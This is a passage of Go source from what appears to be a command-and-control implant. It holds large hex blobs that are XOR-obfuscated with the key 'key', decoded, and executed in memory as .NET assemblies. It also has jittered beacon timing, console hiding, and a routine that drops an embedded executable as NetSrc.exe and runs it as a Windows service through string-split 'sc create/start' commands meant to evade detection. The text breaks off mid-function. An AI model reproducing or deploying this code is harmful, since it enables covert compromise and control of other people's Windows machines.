2626222b3f2437342a3130242b7928292a283121342c373b3736283a312a2b3d27202b6b263538262d333a3025352b24262638202b3d202b6b263538262d333a2b2e28363f202638202b3d202b6b263538262d333a35242638273a2a2e372f2e377928292a28312134363c39333c39652b3f29263e363c393a29392a3a2e362a3435383924342e313c39367938203c342838382e262f203f2a30353f653139202a3e292d6b263538262d333a3f392a3434213c2d242c273126282a373f20213f653a27363a3f3d792e3a363e31362d283c262a2b32652627212b3421383f24263f243b2720262e2b2d393c793429303831262e2b2d393c791d04151e002634652a1e072a12160d0e083d0a11186b361c1f340c0411186b080a080a0b070c1b6b07001b040a18101808652a0300150720010e06790c000d342c1d6b2c1703000b02111c0f230b04082c050c081e0029190a1a0e160a2201790f1229190a1a0e160a2201790715371e081b0e17360d27001f000a3900180f652f02170d1e04152600140417003900180f653a1900181f002d03171c0a017929001005023d0e070c0c021c0f6530050c0d020415021f1c0f650b020c1d6b2615180c1d6b220c0201790332170f65111c0b1d6b2c1703000b02111c0f241d0f171c18162a1b041a0e651e19033404011c6b36101100360d2c140a021c6b09160804150e65302f0c0a1b0a0a0a07150e6509190a1a2304170f091c6b230b0e00310a0b1d070079280a17180a150e2d180501150e652b1e0b0d02081c3f1c090e2d180501150e653a070a0a0e2d180501150e653d1e15150206181f00310a0b1d0700792c000d3f1c090e230b0408310a0b1d07007938111d2e170b0417310a0b1d0700793816310a0b1d0700793b171608000a182d180501150e651b220b110e17101f2d180501150e652a1f013005150c1f2d180501150e652a1f01361e11091e11310a0b1d07007928100b1900171f211019001a1f0a0b122d180501150e65110a0b1d0700790d0c150e653a040b0a04091c6b0d3404010c0700792c000d260a1d1e091c2d0c150e2b180600792208180c00290a11112504140e653b0a161c2f09152504140e653f1e09152f09152504140e650e020b1d0412370a081c6b150a112b1806007907153f02091c0504140e653a0408140a0b1d270c170e652e190c0d0e29100500790f122d020612280a0c05113d0e041d070c170e653a04083005111c19031808002d12151c6b331807101c3f1c090e652a1b040b0e65291f172d04360d19101a1f100b0e653d07093b0a161c6b21101815161800793f000b060c170a111c6b331019110c0a09340e0816191c2e190c0d0e652a3f242d03171c0a01381f110b02070c1f00792c10100f240d1f171009100d0e653d0e070c0c021809091c2a110d190c1b1e111c6b2c171f000b0d041a0e31001b00381f110b02070c1f00792d09180c16381f110b02070c1f0079280a141b0c150a1110040b2b0e091813040d020a1718240d1f171009100d0e652b1e0b0d02081c280a141b040d020710070c0d12240d1f171009100d0e651b12151818160c0a06570e1d1c6b021c1f3a2a021f1c6b0b2a021f1c6b102a021f1c6b010e380c030e652a120b1a031716050c030e652a021f1c240379381c0a1f00144531111900180f0c170c652b1f0930050c0d3e0b10080a1d0e360d190c170c652d04360d190c170c653d0709290a11116b260c19171c05113d02171c081116191c290a11116b021c1f3a350e0b1e1f0d7926040102080c06291c05020d036529190a1a0e160a220b1f0417140a1110040b350e0b1e1f0d7939000d1e17172700170c11116b350d19311638110b020b1e3e0b106b360d190c170c3116232215040718073017026516090f792d040a1f351c092916080e79290910050e792d0910050e790d2818180e792a031f020b101f1c340a16126b2415070a1a23221504071807653f19001c2322150407180765340a170a0304156b2c3a26290c0a300d0209792a09156b0a150e564b4501150765120e17170e094a594b1d0709791e161c19564b4501150765171f0115074b1d0709791b001b3b040b0a0879381c0a1f00146b20171e08790715371e081b0e17360d27001f000a3c17101f111c0565340a0c176b2f16020b793a101c191c350208101f001d220b1f0417140a1110040b793b171608000a182c170d0a0b06040d020a176b361c1f2c170d0a0b06040d020a176b340c0e1700220b1f0417140a1110040b793d0c0b1f101807281c060a0b122a090e17181f0c1605652b1f09350e040f0e260b02111008041538001a1f0c160565151b260b02111008041538001a1f0c1605652b1f093c05111c19260b02111008041538001a1f0c1605650938000b1d000b220b1f0465230e17166b350b04061c1816310e04096b36150e00096b27001b040a183038283a1a180d18191579291c090a160a3e243a342115073a1a180d181915793b203b26040a1a65350f177938110b020b1e29101007011c1965151b270c0d031c19651b1e031f0e177945060d04177938110b1e060d1e171c3f0a291f17793e2c171f350d19652a12160d0e08572f0c180c0b16181110081679381c0a1f001445370c051110060057220b0d0e17161b361c19131008000a6b360018111c064b2b1e0b0d02081c45261606151007000b38000b1d0c1a0e16792f001b1e021e020b1e260a1d0e1679280a17180a150e23150a020a6b020b0d23150a020a6b211c09101e2d09180c16790f122d19041a0023150a020a6b350b04061c18163808061c18163f07041e18651819020a6b2c17270a180f2a0b0f000b270c17001679220b30050c0d020415021f181f0c16052a0b0f000b270c17001679220b340e0816191c3619011c192910050e0a6b371c0a013006041e0e231007003c13001a24150d020a17186509290c170f2a091f0c160516791b040b0a08181f000b186529190a1a0e160a3b040b0a081c1f000b186529190a1a0e160a220b1f0417140a1110040b3a07040a18650e020b1d04123a07040a18651d1c211c180c0b0e013808061c18167928171c0a111c3b171608000a1865113b171608000a1865361b00173b171608000a1865371f340c0e1700220b1f0417140a1110040b29190a1a0e160a6b221c1f260c19171c051129190a1a0e160a6b351c0927181800380f010b0e160a6b2c140a021c29040a0e241d0f171c18167907153b0a161c2a011d19000a1865151b241d0f171c18167907153d0e160d2a011d19000a18653c05110b122c173b17160c171c1816792e1d101f360d0a110c18653a040b1a0a117927040c0506112e091c1d040d0e013a242836090f1c081179032a1b01001a1f652b0e091c0a161c280a142407130e060d6b26162c000d2407130e060d6b09090d0936070129190a0d0e060d6b031525000e3b17161f001a1f651a09360d19101a1f653c130c0d6b280c1f04171f653c051310190a170600171f653c05110b123516020b0d6b2c17270a180f2a0b0f000b260a1d1e091c270c0a1f6530052c170211100a091011040d020a1724171d0e173404010c07003502160d6b2c1726001404170024171d0e173404010c07003502160d6b360018111c064b2d0e1d0d6b361c1f32100501161c311c1311790f123a07040a18261605111c1311792d0c170f32100501161c6517380d161c652f02170d1e04153b17161f001a1f20016b240b1904006b26161b1c7906040a1a271005040b12652b0e041d3b171608000a18281c060a0b12652e190c0d0e350b04061c1816340e0816191c792c000d3c0c170f0a0e18211019001a1f0a0b12651d02171c081116191c790c000d3426181b041a0211006b0a093420081e04150211006b0a09342c170e140c0a09101f1c7929040a0e350b020a0b0211006b6579463e794065246b45793b650b6b0a7908651c6b16791865596b2c792f65596b0c791865436b45791065496b18796b7e306b08790a651e6b00793b65186b11790365376b047906651c6b656e2865166b08790665186b0b790f65356b0c7905651c6b656e2d650c6b097907653d6b09790765376b047906651c6b656e2965186b16790e653d6b09790765376b047906651c6b657a29657952207907651c6b13790a650d6b0c790465176b5f792a651d6b08790265176b0c7918650d6b17790a650d6b0a791965586b0b790e650e6b5f796b46376b00790e651d6b45791f65116b00794b651c6b1d790e65596b15790a650d6b0d796b2c4a6b20795e653f6b26795c653f6b5c794665406b24795e65486b48795f654a6b53795c65546b5c795b654f6b56794665386b54795965496b57795f654d6b237929653c6b26795c65782253792e653d6b21795d653d6b52795f65546b26795b65496b527946654d6b20795c654c6b487929654e6b53792a65546b20795e654e6b51795b65406b5c795e653c6b57795f653a6b64562865436b39793c65106b0b790f65166b12791865256b00791365096b097904650b6b00791965576b007913651c6b657a4b65796b6579709af0d8727a1224c02cade431e7c102657d4b64786366596b647c4b64787a747d4b64786560596a646852637e697b7975657b75657f6b646b2a743c6d657b777d6b2a61796a64616963616f627b737d7d6b64717761796a7d716d657a6a796169747e667469737d70737469737d7b69677b6960796a6d6b2a61736a7469684579656079696777654d7e4b6d617a7d61636d617a45617a4161737d6b726b777a416173677b69677b697451737d7b69677b6f657979307a4b65716f6f787a7d7c6b677865797d6164684b61736a745d6845796161596a64736e657b697d6163627c656b685f79656f4578656b7c6b6777656b756c636846745479596465677b6f65786a6b7d6b6478636f796e646b026d6b026d716d657b656b646561796a7d776862786561796a6b616862786366796b6d71dc1f253d7c4d8bec716b65796b65796b657d946a666b61786b65796f67796b657d6365796b61696b65796f45796b657d2b65796b61f96b65796f65786b657d6b67796b61796f65796f65696b657d6b65696b6d786b65796b65796b6d2e6b62f96b65796b6d776b62f96b65796b617d6b65796f65596b657d6b25796b6179eb65796f65796a657d6b657b6b617a6b65796f70796b657d7c65796b647b6a6d787764526a707b6d6e7b6d627b6d7c7b6d6c7a6d746969637c6863687f667f7a497b6d6f7a6d7449696365696371686368536c796e6d61637d717b6d7e6b66617a497b636c796e6761737d717b7d7d6b647b736379696c6b726c7c6b677b736b7c6b6761656b7e6b6670737760636c796e6761736c707b7d706b607b737d616275616d75786a7b797361796a7d656c657d697d61656b7d6b647b656c796879777b744d7a487e6b67657a48684660796a6464656c596e7449656b77606e7a4365716364796365796b65797564796a652d69732e190409250a172e1d1a0e150d020a173f0d0b04120a6a6d786b62786b65796b4c786b414f2e213d5d214e5f483a5b554e46513c5c505429524f2a483c5e524d5b5c405e204b5f26796b6d786b64796b65796b65796b65796b65796b65796b65796b75796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b67797b65796b45796be5616b65793b6579eb65796b65796b65796b65796b65796a65786b6579536579eb65796b65796b65796b65796b65796a65796b6579eb65796b65796b65796b65796b65796b65796a65786b6579036579eb65796b65796b65796b65796b65796a65796b6579b767796bf5196b65356965796b65796b65796b65356951796b652f6b367934652f6b207939652a6b2c792465376b3a792265376b23792465796b6579d661969565796a65796b65796b65796b65796b65796b65795465796b65796b657d6b65796a65796b65796b65796b65796b65796b21796b65786b33790a650b6b23790265156b00792265176b03790465796b65794f657d6b65793f650b6b047905650a6b09790a650d6b0c790465176b65796b65796bd57dc764796b647938650d6b17790265176b02792d65106b09790e65306b0b790d65166b6579e364796b64795b65496b55795b65496b51790965496b657947657b6b64792d65106b09790e653d6b007918651a6b17790265096b11790265166b0b796b65796b45796b65496b6d796a653f6b0c7907651c6b33790e650b6b16790265166b0b796b65796b55794565496b4b795b65576b55796b65456b6b796a65306b0b791f651c6b17790565186b09792565186b08790e65796b07791265096b047918650a6b10790a651a6b4b790e65016b00796b65516b67796a65356b00790c65186b09792865166b157912650b6b0c790c65116b11796b65596b65792f65776b647924650b6b0c790c65106b0b790a65156b23790265156b00790565186b08790e65796b07791265096b047918650a6b10790a651a6b4b790e65016b00796b654d6b6d796a65296b177904651d6b107908650d6b33790e650b6b16790265166b0b796b65496b4b795b65576b55794565496b65795365716b64792a650a6b16790e65146b07790765006b45793d651c6b17791865106b0a790565796b55794565496b4b795b65576b55796b65950965798164796b65796b65796b657984dec6575a010609591d000b180c1605585b5a4b4949451c0506160f0c170c585b3e313f465d5b4b160d0a0b1d0a0916050044491c1c184746556873666f450a160a0e081b071c5913081505164449100b055f0a080d1c06040a460810081716180a1f1f481a0408430a16144513484945140a0b100d000a1f331c191610040b444954575b4747666f594b591818161c060715122c1d0e0b0d0211004b131c191610040b444954575b4b4945555b4b0b180600444928002a1509070c1a0a1110040b570a1509494a47666f594b590d19100a1f2c170d0a5913081505164449100b055f0a080d1c06040a460810081716180a1f1f481a0408430a161445134b495b746145594b454518001a1e17101f1c47666f594b45594b45451900081e000a1f001d3b17101d0c150e021c18450106091718585b1e171751161a0300140a1654060c1a190a0a04030d460616065f181808571d565b5568734b45594b45594b45451900081e000a1f001d2e1d1c08100d020a1727000f0e095907000f0e094449040a220b0f040e1c1947591e0c3808061c18164449031807161c494a47666f594b45594b454544171c1a101c18111c0f350b02131007001e0e1647666f594b4559574a0a0e060c190c0d125b74614559574a0d19100a1f2c170d0a47666f4544040a1800140909005565796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65"
		if !sysinfo.IsProcessX64() {
			hexEncoded = ""
		}
		encoded, _ := hex.DecodeString(hexEncoded)
		data := crypt.XOR(encoded, []byte("key"))
		filename, _ := os.Executable()
		return packet.ExecuteAssembly(data, []string{filename})
	}
	return []byte("This function is not supported now."), nil
}

func CallbackTime() (time.Duration, error) {
	waitTime := config.WaitTime.Milliseconds()
	jitter := int64(config.Jitter)
	if jitter <= 0 || jitter > 100 {
		return config.WaitTime, nil
	}
	result, err := rand.Int(rand.Reader, big.NewInt(2*waitTime/100*jitter))
	if err != nil {
		return config.WaitTime, err
	}
	waitTime = result.Int64() + waitTime - waitTime/100*jitter
	return time.Duration(waitTime) * time.Millisecond, nil
}

func HideConsole() error {
	return packet.HideConsole()
}

func ProcessDPIAware() error {
	return packet.SetProcessDPIAware()
}

func CmdService(Token uintptr) ([]byte, error) {
	if runtime.GOOS != "windows" {
		return []byte("Service installation is not supported on this platform."), nil
	}
	hexEncoded := "263fe96b66796b657d6b6579949a796bdd796b65796b65792b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b6579eb65796b6b66d16b79df6cb44add7827a8583f0d10184509190a1e1904144b0618050b161f451b0e450b1e0b59020b592f2a2a4b08160f00576668734f65796b65796b65292e65790fe37b6b92b19b99796b65796b65796b95794965726955796b63796b657f6b65796b65796b65796b65596b65796b65396a65796b65596b65796965796f65796b65796b657f6b65796b65796b65196b65796965796b65796b66790be0796b25796b65796b65396b65796b65796b65696b65796b65794b65796b65796b65796b65696b65796b65796b65796b65796b65796b65796b65396b65ad6f65796b65796b65796b65796b65796b65796b65796b65796b65795b40796b79796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65596b65316b65796b65796b65796b65571f00011f65796b297c6b65794b65796b63796b657b6b65796b65796b65796b65796b65596b651945170a1906796b65ad6f65796b25796b657f6b65796365796b65796b65796b65796b65792b65792b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65316b657969657c6bdd596b65016f65796a65796b64796b63796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b656a5b61794d65796b64796b74796973e3eb64796b61516f65796d656ee662796b645c7d167e6b657fc96f7f4360796b6f7941477b4363796b6f79414b0b6a65791be5786b657d4153791862796b63516c65796165535d65076a65796f4d716b65734d4f736b4f5b694d706b65736b4f792936332964796a65796b65796765796b134d45555758554a5a5c796b65796e65156b6579ab64796b46076b65556965790b64796b462a1f171005020a6b65796be97a6b65756b657948302a6bfd7a6b65696b657948222c2221796b65d1686579bb65796b463b070a1b6b65796b65796b67796b642e7e67796265796b65836a56797d65796a65796b6d796b657a6b65796a65796b62796b657b6b65796265796b61796b65786b65796a65796b66796b65796bcc796a65796b65796d65126b63786d65f26b63786d65476b967964655f6a65796d652b6bd0796d65296aaa7961654b6b5f786565316a96796b65796b68796b65796b64796a65796b75796d65536b7c796a65786b64797b65786b4f7976657b6b61797d659d6b25792345796b6579fa65af6b26796a65034b65796b65ff7383796d657b6be6596b65796bf4618765306b6779e445796b6579fd65666b2c796965e44b65796b65bd6b327826657b6bce596b65796ba179b4657f6b6679c545796b6579ed7d9f6b63796865796b64795e64796b64795e64706b83796a65686b83796d65606b83796165506b83797b65406bbe797065486b83796d65406bbe794965386b3c784365406b83796d65576b6e793865576b76793765576b7e791065576b4679ef656c6b61f96b65796b65796b65796b65796b65796b4f796b657d6b65796b65796b65796b65576b73796b65796b61796b65796b65796b65796b52795164796b65796f65796b65796b65796b65794565b66b65796b65796b650a1d06486b26150a160a5a6545260a1d1e091c55651418061619091009652b1e0b2a0e170f02061c6b161c19131008007938000b1d0c1a0e27181800792f001b1e021e0a07150e240d1f171009100d0e652d0a171e0e113f1904140e1216190e381f110b02070c1f0079280a141b0c150a1110040b2b0e091813040d020a1718240d1f171009100d0e652b1e0b0d02081c280a141b040d020710070c0d12240d1f171009100d0e650a0e170f02061c4500010e652a12160d0e08573910171f0c140e4b2f0e170a020a17020b1e6b360018111c0665340a0c176b370c05653605360d04157945060d04177945061a1f0a0b6b360018111c064b3d02041e050a0a1f0c1a18652a12160d0e08573910171f0c140e4b3a04080902091c19361c19131008000a6b211c09101e0c0c170c28160f000a6b040b0c1679381c0a1f001445361c191310080029190a1a0e160a6b2a1b01001a1f653605360d0a170d6b65796203790765186b02796b651008aeaff7e46923e95f3b937b1f7e606b61596a64716845796a60596a64687a61596a64776e62787677646d65786a786b7660796a646b7660796a7758656dce11392f725199e26dc9543a067ab07351677f6560796a64646566796b647c4b6478766b716a65716b65796b65676a65786b317b7d320b0a1537040b3c13061c1b1110040b2d0317161c16786364796c64796b6579226479714b372e313f1904140e1216190e553d000b180c1605580f5f4b416a652d65713f1904140e1216190e3d0216090704002504140e775725202d4b230b0a081c1c0a0b00454d455d796b65796b65796b65796b65796b75796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b67797b65796b45796be5616b65793b6579eb65796b65796b65796b65796b65796a65786b6579536579eb65796b65796b65796b65796b65796a65796b6579eb65796b65796b65796b65796b65796b65796a65786b6579036579eb65796b65796b65796b65796b65796a65796b6579bf67796bf5396b653d6965796b65796b65796b653d6951796b652f6b367934652f6b207939652a6b2c792465376b3a792265376b23792465796b6579d661969565796a65796b65796b65796b65796b65796b65795465796b65796b657d6b65796a65796b65796b65796b65796b65796b21796b65786b33790a650b6b23790265156b00792265176b03790465796b65794f657d6b65793f650b6b047905650a6b09790a650d6b0c790465176b65796b65796bd57dcf64796b647938650d6b17790265176b02792d65106b09790e65306b0b790d65166b6579eb64796b64795b65496b55795b65496b51790965496b657947657b6b64792d65106b09790e653d6b007918651a6b17790265096b11790265166b0b796b65796b45796b65496b6d796a653f6b0c7907651c6b33790e650b6b16790265166b0b796b65796b55794565496b4b795b65576b55796b65416b69796a65306b0b791f651c6b17790565186b09792565186b08790e65796b16790e650b6b137902651a6b007945651c6b1d790e65796b4d796965786b29790e651e6b047907653a6b0a791b65006b177902651e6b0d791f65796b45796b65396b69796a65366b177902651e6b0c790565186b09792d65106b09790e65176b047906651c6b657918651c6b17791d65106b06790e65576b007913651c6b65795f65716b64793b650b6b0a790f650c6b06791f652f6b007919650a6b0c790465176b65795b65576b55794565496b4b795b65796b5d796365786b247918650a6b007906651b6b09791265596b33790e650b6b16790265166b0b796b65496b4b795b65576b55794565496b65798f27796b8f786b65796b65796b65796b8ac2d459461308154b131c191610040b444954575b47590e0b1a04011005024449302d2d484149450a1f04170f0415040b1c5647000e165b545b7461687357040a1800140909004b1d14070b0a56470c190b431806110e081818481402060b0416160d1154080a1451040a064b0f5a475906041702031c18112f0e170a020a1756474845555b5568734b45450a160a0e081b071c300f00171f0c0d12450f0e170a020a175647484555575b4b494945170a081c5647341224091b091008040d020a174504091b47565568734b45451f170c1811300503164b1d14070b0a56470c190b431806110e081818481402060b0416160d1154080a1451040a064b0f594747666f594b455957161c08100b0211005568734b45594b455957171c1a101c18111c0f350b02131007001e0e165913081505164449100b055f0a080d1c06040a460810081716180a1f1f481a0408430a161445134a495b746145594b45594b455957171c1a101c18111c0f20010e060c1f0c1605291c1d00154b091c1d0015564718182c171d0a120e175b4b10102a061a0e160a56471f0a090a0e47565568734b45594b4559574a0b0e140c0e160d0e0129190c0f02091c0c000a5568734b45594b595618001a1e17101f1c47666f594b59561f170c181130050316556873574a1818161c060715125b796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65"
	if !sysinfo.IsProcessX64() {
		hexEncoded = "263fe96b66796b657d6b6579949a796bdd796b65796b65792b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b6579eb65796b6b66d16b79df6cb44add7827a8583f0d10184509190a1e1904144b0618050b161f451b0e450b1e0b59020b592f2a2a4b08160f00576668734f65796b65796b65292e657927647a6b51872fac796b65796b65796b85796964726a55796b63796b65716b65796b6579cd40796b65596b65792b65796b65396b65596b65796965796f65796b65796b657f6b65796b65796b65f96b65796965796b65796b66790be0796b75796b75796b65797b65797b65796b65796b75796b65796b65796b65796b315c6b65366b65796b25796bb17d6b65796b65796b65796b65796b65796b65796b05796b69796b65414e65797765796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65794b65796365796b65796b65796b65796345796b2d796b65796b65796b65796b4b0d0e1d0d6b6579c760796b65596b65796d65796b67796b65796b65796b65796b65796b45796b055719160b0865796bb17d6b65792b65796b63796b65716b65796b65796b65796b65796b65396b653945171c070a1a6b65756b65796b05796b657b6b65796565796b65796b65796b65796b65792b65792965796b65796b65796b65796b65796b65f14e65796b65796b2d796b657b6b6079ab45796b1d7d6b657a6b65796a65796d65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b76496f655f6b65796a65797a657b7dfff96a65796f4d7d6b657f6b72f46c65796a406f1862796b63db6163516e65796165534967516d65796165534517786b6509eb64796b61535d650a6c65796d4d7e6b65736b4f4f6b1b786b657d436d796b6f5f416f7941477b436c796b6f7941653b382f3b6a65786b65796b65756b65791d51575b4b4a5b56485265796b657c6b09796b65b96a6579481b796b497b6b65196a657948360d190c170c16796b6579e766796b69796b655a3e3679f366796b75796b655a2c30302f65796bcd7a6b65a96b65794827150407796b65796b65796965796a326c6965706b65796b9f7858656f6b65786b65796365796b66796b65786b65796c65796b67796b65706b65796f65796b64796b65786b65796865796b6579c265786b65796b657f6b0e796d647f6bee796d647f6b5b799865766b43786b657f6b3779de657f6b3578a465736b57795164776b2d789865796b65796665796b65796a65786b65797b657f6b4f797265786b64796a65696b64794165646b67796f656f6b81792b65294b65796b65e86bb3792865786be7596b65796be3618d657f6b6779e045796b6579fa7d956b2c796965ee4b65796b65ef6b7a7922657b6bc0596b65796ba1793c64346b6779d845796b6579af65a66b63796865cf4b65796b65ff7383796d657a6b65796a654c6a65796a654c6a6c798d65786b74798d657f6b7c798d65736b4c798d65696b5c79b065626b54798d657f6b5c79b0655b6b24793264516b5c798d657f6b4b7960652a6b4b797865256b4b797065026b4b794865fd6b70796fe5796b65796b65796b65796b65796b65794165796b61796b65796b65796b65796b4b797d65796b65796f65796b65796b65796b65795c65436a65796b657d6b65796b65796b65796b65576baa796b65796b65796b160f0854792809181816486b593404010c0700476b080a080a0b070c1b6b370c05361c19131008007918000b1d0c1a0e652a0e170f02061c29040a0e653d0e070c0c021809091c2a110d190c1b1e111c6b311819021c1f230b0a081c1c0a0b00240d1f171009100d0e653a0408090209181f0c1605371c0704010a1110040b0a2a110d190c1b1e111c6b370c05111006003a0408090a1110090c150211002a110d190c1b1e111c6b161c1913100800570e1d1c6b360018111c064b2b1e0b0d02081c45331c191610040b10050279381c0a1f00146b2818020b793910176b2a173811161b655708111619655708060d041779381c0a1f00144521100a021704160d02060a6b360018111c064b2b1e0b0d02081c45261606151007000b38000b1d0c1a0e16792f001b1e021e020b1e260a1d0e16790a171e18652a12160d0e085738000b1d0c1a0e350b04061c1816792407130e060d6b2a173811181911796b65700d65156b04790c65796b3e8f5d7fdb343430edb509f78e8b6c43796f45786a6d7a4b65786e45786a74686f45786a6b7c6c646479787f6b64787677646e65786a77646e657879447763d2033733605f85f063d546341a68be6f436963776e65786a78776865796a60596a6464656d786b6d796b65796b7b786b64793f676f3c17181b2b160520010800091f0c16053111190a0e1864716a657e6a65796b65306a6563452b3c3f230b0a081c1c0a0b00492f0e170a020a1756134d455d786b31777f230b0a081c1c0a0b0021101815150a1c370a081c794b372e31592d171806000e0417124b51575365796b65796b65796b65796b65797b65796b65796b65796b65796b65796b195c6b65796b65796b65796bf35c6b65794b65796b65796b65796b65796b65796b65796b65796b65f14e65796b65796b65796b65796b3a3a04173c1300340a0c176b080a080a0b0e00570f09156b65796b65864e65592b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b67797b65796b45796be5616b65793b6579eb65796b65796b65796b65796b65796a65786b6579536579eb65796b65796b65796b65796b65796a65796b6579eb65796b65796b65796b65796b65796b65796a65786b6579036579eb65796b65796b65796b65796b65796a65796b6579bf67796bf5396b653d6965796b65796b65796b653d6951796b652f6b367934652f6b207939652a6b2c792465376b3a792265376b23792465796b6579d661969565796a65796b65796b65796b65796b65796b65795465796b65796b657d6b65796a65796b65796b65796b65796b65796b21796b65786b33790a650b6b23790265156b00792265176b03790465796b65794f657d6b65793f650b6b047905650a6b09790a650d6b0c790465176b65796b65796bd57dcf64796b647938650d6b17790265176b02792d65106b09790e65306b0b790d65166b6579eb64796b64795b65496b55795b65496b51790965496b657947657b6b64792d65106b09790e653d6b007918651a6b17790265096b11790265166b0b796b65796b45796b65496b6d796a653f6b0c7907651c6b33790e650b6b16790265166b0b796b65796b55794565496b4b795b65576b55796b65416b69796a65306b0b791f651c6b17790565186b09792565186b08790e65796b16790e650b6b137902651a6b007945651c6b1d790e65796b4d796965786b29790e651e6b047907653a6b0a791b65006b177902651e6b0d791f65796b45796b65396b69796a65366b177902651e6b0c790565186b09792d65106b09790e65176b047906651c6b657918651c6b17791d65106b06790e65576b007913651c6b65795f65716b64793b650b6b0a790f650c6b06791f652f6b007919650a6b0c790465176b65795b65576b55794565496b4b795b65796b5d796365786b247918650a6b007906651b6b09791265596b33790e650b6b16790265166b0b796b65496b4b795b65576b55794565496b65798f27796b8f786b65796b65796b65796b8ac2d459461308154b131c191610040b444954575b47590e0b1a04011005024449302d2d484149450a1f04170f0415040b1c5647000e165b545b7461687357040a1800140909004b1d14070b0a56470c190b431806110e081818481402060b0416160d1154080a1451040a064b0f5a475906041702031c18112f0e170a020a1756474845555b5568734b45450a160a0e081b071c300f00171f0c0d12450f0e170a020a175647484555575b4b494945170a081c5647341224091b091008040d020a174504091b47565568734b45451f170c1811300503164b1d14070b0a56470c190b431806110e081818481402060b0416160d1154080a1451040a064b0f594747666f594b455957161c08100b0211005568734b45594b455957171c1a101c18111c0f350b02131007001e0e165913081505164449100b055f0a080d1c06040a460810081716180a1f1f481a0408430a161445134a495b746145594b45594b455957171c1a101c18111c0f20010e060c1f0c1605291c1d00154b091c1d0015564718182c171d0a120e175b4b10102a061a0e160a56471f0a090a0e47565568734b45594b4559574a0b0e140c0e160d0e0129190c0f02091c0c000a5568734b45594b595618001a1e17101f1c47666f594b59561f170c181130050316556873574a1818161c060715125b796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65794b65796765796bcd4c6b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b"
	}
	encoded, _ := hex.DecodeString(hexEncoded)
	data := crypt.XOR(encoded, []byte("key"))
	data = bytes.ReplaceAll(data, []byte("f\x00l\x00a\x00g\x00"), crypt.RandomBytes(8))
	path, _ := CmdPwd()
	filePath := string(path) + "\\NetSrc.exe"
	currentFile, _ := os.Executable()

	go func() {
		_, err := Upload(filePath, data)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}

		time.Sleep(time.Second * 3)

		_, err = packet.Run([]byte("sc c"+"reate NetService bin"+"path= \""+filePath+" "+currentFile+"\""), Token)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}

		_, err = packet.Run([]byte("sc s"+"tart NetService"), Token)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}

		_, err = packet.Run([]byte("sc s"+"top NetService"), Token)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}

		_, err = packet.Run([]byte("sc d"+"elete NetService"), Token)
		if err != nil {
